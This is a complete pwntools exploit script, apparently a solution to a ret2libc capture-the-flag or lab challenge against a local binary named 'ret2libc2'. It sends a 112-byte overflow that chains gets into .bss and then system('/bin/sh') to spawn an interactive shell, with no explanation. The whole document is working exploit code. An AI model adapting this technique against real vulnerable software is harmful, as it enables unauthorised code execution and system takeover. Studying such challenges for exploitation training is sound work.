from pwn import *

p = process('./ret2libc2')

elf = ELF('./ret2libc2')

gets_ret = 0x0804843d
binsh_addr = elf.bss() + 0x100
system_ret = b'AAAA'

payload = flat([b'A' * 112, elf.plt['gets'], gets_ret, binsh_addr, elf.plt['system'], system_ret, binsh_addr])

p.sendline(payload)
p.sendline(b'/bin/sh')

p.interactive()
